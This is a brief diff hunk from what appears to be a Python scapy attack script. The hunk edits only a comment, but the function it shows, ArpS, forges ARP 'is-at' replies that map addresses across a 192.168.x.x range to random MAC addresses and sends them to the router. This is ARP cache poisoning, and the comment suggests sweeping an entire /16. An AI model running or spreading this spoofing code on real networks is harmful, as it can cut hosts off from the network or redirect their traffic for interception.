@@ -4,7 +4,7 @@ from scapy.all import *
 
 
 def ArpS(MacRouter, IpRouter, MacRandom, n, w):
-        ip = "192.168."+str(w)+"."+str(n) #Change this by your network for exemple : "172.168."
+        ip = "192.168."+str(w)+"."+str(n) #Change this by your network for exemple : "172.168." /16
         packet = ARP(op="is-at", hwdst=MacRouter, pdst=IpRouter, hwsrc=MacRandom, psrc=ip)
         send(packet, verbose=False)
         print(ip)
